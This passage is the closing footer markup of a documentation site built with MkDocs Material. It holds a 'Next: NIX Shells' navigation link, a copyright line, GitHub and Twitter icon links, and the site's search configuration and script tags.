class=md-ellipsis> <span class=md-footer__direction> Next </span> NIX Shells </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2021 - 2022 dh </div> </div> <div class=md-social> <a href=https://github.com/hrmnsio target=_blank rel=noopener title=github.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg> </a> <a href=https://twitter.com/dhrmns target=_blank rel=noopener title=twitter.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg> </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../..", "features": ["content.code.annotate", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest"], "search": "../../assets/javascripts/workers/search.361d90f1.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script> <script src=../../assets/javascripts/bundle.289a2a4b.min.js></script> </body> </html>